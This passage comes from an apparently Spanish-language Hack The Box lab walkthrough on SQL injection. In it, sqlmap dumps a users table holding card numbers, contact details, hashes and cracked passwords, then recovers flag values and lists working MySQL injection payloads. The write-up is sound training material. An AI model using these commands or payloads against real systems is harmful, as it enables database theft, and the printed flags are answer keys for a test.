| 18 | 4485934311754598 | CyndiBReyes@gmail.com       | 903-679-2061 | Cyndi Reyes       | 4347 Hall Place        | June 5 1947       | 15ce1871a907e8265f00defa21a723e7a4d35267 (plasid)           | Executive                                         |
| 19 | 5217064909950341 | WilliamDMunoz@gmail.com     | 323-789-6686 | William Munoz     | 2961 Hillhaven Drive   | July 4 1928       | df692aa944eb45737f0b3b3ef906f8372a3834e9 (1201Hunt)         | Service station attendant                         |
| 20 | 4929461176669103 | ScottBPonce@yahoo.com       | 626-537-0602 | Scott Ponce       | 3023 Woodstock Drive   | September 19 1947 | 20021ffbd3be7a3cddc64812d5dd6e5afb6e760c (donatus)          | Benefits manager                                  |
| 21 | 4916977560623393 | PhilipTAhearn@gmail.com     | 509-327-6685 | Philip Ahearn     | 4418 Goodwin Avenue    | May 22 1938       | 3d8f48ab8e119dd813a449f6bfcf42abae63567b (sk8ter58)         | Office assistant                                  |
| 22 | 5480619405065199 | MyraJStephenson@yahoo.com   | 717-770-6897 | Myra Stephenson   | 4225 Aaron Smith Drive | December 25 1966  | 41244ab550c182b3ebe2dce87065bf363d0e013e (sgreen4eva)       | Animator                                          |
| 23 | 4532761682899246 | MarianCJoiner@yahoo.com     | 707-467-5061 | Marian Joiner     | 273 Fairway Drive      | February 12 1978  | 5635e59941510dc473fbeed046c43007f76cfe03 (melek200215)      | Foundry mold and coremaker                        |
| 24 | 5357620822740711 | LloydSLiu@gmail.com         | 616-396-4287 | Lloyd Liu         | 3277 Howard Street     | August 18 1951    | 09422b94c8f031285b22500c2d0a68bb8ec4dc70                    | Sound engineering technician                      |
| 25 | 5219707450752213 | JoshuaEFletcher@gmail.com   | 317-670-8864 | Joshua Fletcher   | 1510 Stewart Street    | August 14 1934    | 65b136cb1ec4b88f709f8f510262720eddfa71a7 (mike230040)       | Edition binding worker                            |
| 26 | 4485684355495794 | MargaretNBooker@msn.com     | 760-969-7147 | Margaret Booker   | 70 Wilson Street       | December 17 1975  | 4282cfe7697817374251bc17aa47de6f620586b5 (hjungpil1)        | Management information systems director           |
| 27 | 5134210174158363 | FrancisMArroyo@yahoo.com    | 951-252-9692 | Francis Arroyo    | 3600 Hillcrest Lane    | July 6 1993       | f2d897eb3bae0f1fd396325deb3c4779ae1d586d (ford1900)         | Gastroenterology nurse                            |
| 28 | 4485114901308234 | AngelJMarquez@gmail.com     | 209-874-4743 | Angel Marquez     | 1144 Richards Avenue   | May 14 1966       | 4bf1926f7bb7ae283e1390236fd4a8737209862e (rohaniah)         | Echocardiographer                                 |
| 29 | 4532210842993911 | PamelaJRock@yahoo.com       | 715-454-8565 | Pamela Rock       | 3110 Abner Road        | October 31 1992   | c7fbcdaf308cdcd64504d46342e7c79959388c44 (exquisite)        | Private investigator                              |
| 30 | 4556109704569770 | DennisDSnow@yahoo.com       | 715-730-1951 | Dennis Snow       | 4211 Tea Berry Lane    | November 10 1938  | 6725c7bee76ccdb7eda15fa263908988115498a9 (aza221p)          | Unlicensed assistive personnel                    |
| 31 | 5554945940459873 | LorenSBunch@gmail.com       | 805-766-2963 | Loren Bunch       | 3111 Par Drive         | October 22 1971   | 70f361f8a1c9035a1d972a209ec5e8b726d1055e (05adrian)         | Cafeteria cook                                    |
| 32 | 4716522746974567 | KennethTMaloney@gmail.com   | 954-617-0424 | Kenneth Maloney   | 2811 Kenwood Place     | May 14 1989       | c6970ba1130b4bbca5be99f0ce00a706f256c818                    | General and operations manager                    |
+----+------------------+-----------------------------+--------------+-------------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+

[16:23:46] [INFO] table 'testdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/94.237.59.16/dump/testdb/users.csv'
[16:23:46] [INFO] fetching columns for table 'flag3' in database 'testdb'
[16:23:46] [INFO] fetching entries for table 'flag3' in database 'testdb'
Database: testdb
Table: flag3
[1 entry]
+----+------------------------------------------+
| id | content                                  |
+----+------------------------------------------+
| 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r75} |
+----+------------------------------------------+

[16:23:46] [INFO] table 'testdb.flag3' dumped to CSV file '/home/kali/.local/share/sqlmap/output/94.237.59.16/dump/testdb/flag3.csv'
[16:23:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/94.237.59.16'

[*] ending @ 16:23:46 /2024-08-06/

```

Fijaros que locura, que SQLmap nos hace un dump de los hashes de todos los usuarios de la base de datos, las contraseñas en plano crackeadas, emails, teléfonos, direcciones... y al final encontramos la flag! 🏆

### Pregunta 3

¿Cuál es el contenido de la tabla flag4? (Case  #4)

<figure><img src="/files/rUw35LemKfDXxOu8essj" alt=""><figcaption></figcaption></figure>

Capturamos la petición HTTP con BurpSuite:

```
// Some code
```

```bash
sqlmap -r burp-4.req --batch --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:53:15 /2024-08-06/

[16:53:15] [INFO] parsing HTTP request from 'burp-4.req'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[16:53:15] [INFO] testing connection to the target URL
[16:53:15] [INFO] testing if the target URL content is stable
[16:53:16] [INFO] target URL content is stable
[16:53:16] [INFO] testing if (custom) POST parameter 'JSON id' is dynamic
[16:53:16] [INFO] (custom) POST parameter 'JSON id' appears to be dynamic
[16:53:16] [INFO] heuristic (basic) test shows that (custom) POST parameter 'JSON id' might be injectable (possible DBMS: 'MySQL')
[16:53:16] [INFO] heuristic (XSS) test shows that (custom) POST parameter 'JSON id' might be vulnerable to cross-site scripting (XSS) attacks
[16:53:16] [INFO] testing for SQL injection on (custom) POST parameter 'JSON id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[16:53:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:53:16] [WARNING] reflective value(s) found and filtering out
[16:53:16] [INFO] (custom) POST parameter 'JSON id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="id")
[16:53:16] [INFO] testing 'Generic inline queries'
[16:53:16] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:53:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:53:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:53:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:53:17] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[16:53:17] [WARNING] potential permission problems detected ('command denied')
[16:53:17] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[16:53:17] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[16:53:17] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[16:53:17] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:53:17] [INFO] (custom) POST parameter 'JSON id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[16:53:17] [INFO] testing 'MySQL inline queries'
[16:53:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[16:53:17] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                           
[16:53:28] [INFO] (custom) POST parameter 'JSON id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[16:53:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:53:39] [INFO] (custom) POST parameter 'JSON id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[16:53:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:53:39] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:53:39] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:53:39] [INFO] target URL appears to have 6 columns in query
[16:53:40] [INFO] (custom) POST parameter 'JSON id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"id":"1 AND 2256=2256"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"id":"1 AND (SELECT 1199 FROM(SELECT COUNT(*),CONCAT(0x71717a7a71,(SELECT (ELT(1199=1199,1))),0x716b766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"}

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: {"id":"1;SELECT SLEEP(5)#"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 3131 FROM (SELECT(SLEEP(5)))FxEB)"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: {"id":"1 UNION ALL SELECT CONCAT(0x71717a7a71,0x505779627a43704569466c556c79705a794d7744547872597665616871556663616f69794a4d7346,0x716b766a71),NULL,NULL,NULL,NULL,NULL-- -"}
---
[16:53:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:53:40] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[16:53:40] [INFO] fetching current database
[16:53:40] [INFO] fetching tables for database: 'testdb'
[16:53:40] [INFO] fetching columns for table 'flag4' in database 'testdb'
[16:53:40] [INFO] fetching entries for table 'flag4' in database 'testdb'
Database: testdb
Table: flag4
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{j450n_v00rh335_53nd5_6r475} |
+----+---------------------------------+

<-----SNIP----->

[16:53:44] [INFO] table 'testdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/94.237.59.16/dump/testdb/users.csv'
[16:53:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/94.237.59.16'

[*] ending @ 16:53:44 /2024-08-06/

```
